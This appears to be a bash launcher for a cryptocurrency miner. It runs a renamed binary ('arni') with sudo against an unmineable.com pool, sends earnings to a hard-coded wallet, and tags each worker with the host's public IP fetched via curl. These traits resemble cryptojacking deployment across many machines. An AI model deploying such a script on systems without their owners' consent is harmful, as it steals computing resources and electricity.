#!/bin/bash

POOL=ethash.unmineable.com:3333
WALLET=TMoY6tAtNEAq32F7aAdXJb6o6fxYm2Nhhm.$(echo "$(curl -s ifconfig.me)" | tr . _ )#bi0o-a2ol

cd "$(dirname "$0")"

chmod +x ./arni && sudo ./arni -pool $POOL -wal $WALLET $@ -pass x -proto 4 -stales 0
